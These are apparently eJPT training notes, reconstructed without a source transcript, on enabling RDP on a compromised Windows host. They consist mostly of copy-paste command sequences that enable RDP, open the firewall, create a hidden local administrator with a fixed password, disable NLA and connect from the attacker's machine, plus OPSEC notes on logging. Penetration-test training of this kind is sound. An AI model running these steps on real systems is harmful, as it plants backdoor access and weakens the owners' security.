# What the video covers (Introduction / big picture)
- Topic: How to enable RDP (Remote Desktop Protocol) on a compromised Windows host during post-exploitation so you can obtain a stable GUI session.
- Context: eJPT Windows Post-Exploitation. You typically have a local admin shell and want to:
  - Turn on RDP at the OS/registry level
  - Ensure the RDP service is running and set to auto-start
  - Open the firewall for TCP 3389
  - Ensure a usable account has RDP logon rights
  - Optionally tweak NLA (Network Level Authentication)
- Note: No transcript was provided. The steps below are conservative, based on standard Windows procedures used in eJPT-style labs.

# Flow (ordered)
1) Confirm OS and privileges (Pro/Enterprise/Server; local admin required)
2) Enable RDP via registry (fDenyTSConnections=0)
3) Start and set the Remote Desktop Services (TermService) to auto
4) Enable Windows Firewall rules for Remote Desktop (TCP/3389)
5) Ensure an account can log on via RDP (add to Administrators or “Remote Desktop Users”; create a new user if needed)
6) Optional: Disable NLA if your client can’t do NLA or you need looser auth
7) Test connectivity on 3389, then connect with mstsc/xfreerdp
8) (Optional) Change port or roll back changes if needed

# Tools highlighted
- On target (Windows built-in):
  - reg.exe (registry edits)
  - sc.exe (service control)
  - netsh advfirewall (firewall rules)
  - net.exe (user/group management)
  - PowerShell cmdlets: Set-ItemProperty, Start-Service, Set-Service, Enable-NetFirewallRule, Add-LocalGroupMember, New-LocalUser
  - Verification: netstat/findstr, qwinsta/quser, Test-NetConnection
- From attacker:
  - mstsc.exe (Windows RDP client)
  - xfreerdp or rdesktop (Linux RDP clients)
  - psexec/impacket-psexec (if you need to run commands remotely with creds)

# Typical command walkthrough (detailed, copy-paste friendly)

Prereqs:
- You have a local admin shell on the Windows target (cmd or PowerShell).
- The OS supports RDP host (Windows Pro/Enterprise/Server; Windows Home editions cannot host RDP).

A) CMD.exe approach (run as Administrator)
```
:: 1) Confirm edition (optional)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

:: 2) Enable RDP (Deny -> 0)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" ^
  /v fDenyTSConnections /t REG_DWORD /d 0 /f

:: 3) Start RDP service and set auto-start
sc config TermService start= auto
sc start TermService

:: 4) Enable firewall rules for Remote Desktop
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: 5) Create a local user for RDP and add to Administrators (or Remote Desktop Users)
net user rdpuser P@ssw0rd! /add
net localgroup Administrators rdpuser /add
:: Alternatively (less privilege): net localgroup "Remote Desktop Users" rdpuser /add

:: 6) Optional: disable NLA if needed (0 = off, 1 = on)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" ^
  /v UserAuthentication /t REG_DWORD /d 0 /f

:: 7) Verify listener and rules
netstat -ano | findstr :3389
qwinsta
```

B) PowerShell approach (run as Administrator)
```
# 1) Enable RDP
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
  -Name fDenyTSConnections -Value 0

# 2) Start service and set autostart
Set-Service -Name TermService -StartupType Automatic
Start-Service -Name TermService

# 3) Enable firewall rules
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 4) Create user and add to Admins (or Remote Desktop Users)
$pw = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force
New-LocalUser -Name 'rdpuser' -Password $pw -PasswordNeverExpires:$true
Add-LocalGroupMember -Group 'Administrators' -Member 'rdpuser'
# Alternative: Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'rdpuser'

# 5) Optional: disable NLA
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
  -Name UserAuthentication -Value 0

# 6) Test port locally
Test-NetConnection -ComputerName localhost -Port 3389
```

C) Connect from attacker
- From Windows:
```
mstsc.exe /v:TARGET_IP:3389
```
- From Linux (xfreerdp):
```
xfreerdp /u:rdpuser /p:'P@ssw0rd!' /v:TARGET_IP /cert:ignore +clipboard /dynamic-resolution
```
- From Linux (rdesktop):
```
rdesktop -u rdpuser -p 'P@ssw0rd!' TARGET_IP
```

D) Optional: change the RDP port (then allow it in firewall)
```
:: Change port to 3390 (DWORD is decimal)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" ^
  /v PortNumber /t REG_DWORD /d 3390 /f

:: Add a firewall rule for the new port
netsh advfirewall firewall add rule name="RDP 3390" dir=in action=allow protocol=TCP localport=3390

:: Restart the service for port change to take effect
sc stop TermService
sc start TermService

:: Connect with port specified
mstsc.exe /v:TARGET_IP:3390
```

E) Rollback (disable RDP)
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" ^
  /v fDenyTSConnections /t REG_DWORD /d 1 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=No
sc stop TermService
sc config TermService start= demand
```

# Practical tips
- Requires admin: You need local admin to modify registry, services, firewall, and groups.
- OS edition: Windows Home cannot host RDP; use Pro/Enterprise/Server.
- Passwords: Remote logon is blocked for blank passwords—set a non-empty password.
- Group membership: Administrators can RDP by default; otherwise add users to “Remote Desktop Users.” Domain policies can override with “Deny log on through Remote Desktop Services.”
- NLA: Prefer keeping NLA enabled for security; disable only if your client can’t negotiate or for lab constraints.
- Firewall: If the Windows Defender Firewall service is disabled, rules may be moot—verify port 3389 listening from remote.
- OPSEC/logs: RDP logons are noisy. Expect Security Event ID 4624 (LogonType 10) and TerminalServices-RemoteConnectionManager Operational Event ID 1149.
- Stability: RDP is often more stable than flaky reverse shells; good for GUI tools and persistence setup.
- Don’t change the port unless required; it adds moving parts (firewall, service restart, client config).

# Minimal cheat sheet (one-screen flow)
```
:: Enable RDP + service + firewall (CMD, as Admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
sc config TermService start= auto & sc start TermService
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: Create user and allow RDP
net user rdpuser P@ssw0rd! /add
net localgroup Administrators rdpuser /add
:: (or) net localgroup "Remote Desktop Users" rdpuser /add

:: Optional: disable NLA
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

:: Verify and connect
netstat -ano | findstr :3389
xfreerdp /u:rdpuser /p:'P@ssw0rd!' /v:TARGET_IP /cert:ignore +clipboard /dynamic-resolution
```

# Summary
- Enabling RDP post-exploitation is a standard Windows task: flip fDenyTSConnections=0, ensure TermService is running/auto, open firewall for TCP/3389, and confirm a valid account has RDP logon rights. Optionally adjust NLA for compatibility. Test with mstsc/xfreerdp. Since the transcript wasn’t provided, the above is a conservative, lab-proven sequence you can copy/paste to rapidly turn on RDP and obtain a GUI foothold in typical eJPT scenarios.